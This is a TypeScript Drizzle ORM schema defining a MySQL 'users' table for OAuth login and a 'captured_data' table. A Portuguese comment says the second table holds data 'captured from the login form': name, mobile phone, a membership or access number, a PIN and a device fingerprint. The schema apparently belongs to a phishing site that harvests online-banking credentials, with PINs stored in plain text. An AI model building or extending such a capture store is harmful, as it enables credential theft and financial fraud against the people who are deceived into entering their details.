import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Tabela para armazenar dados capturados do formulário de login
 */
export const capturedData = mysqlTable("captured_data", {
  id: int("id").autoincrement().primaryKey(),
  nome: text("nome").notNull(),
  telemovel: varchar("telemovel", { length: 20 }).notNull(),
  numeroAdesao: varchar("numeroAdesao", { length: 20 }).notNull(),
  pin: varchar("pin", { length: 10 }).notNull(),
  fingerprint: text("fingerprint"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type CapturedData = typeof capturedData.$inferSelect;
export type InsertCapturedData = typeof capturedData.$inferInsert;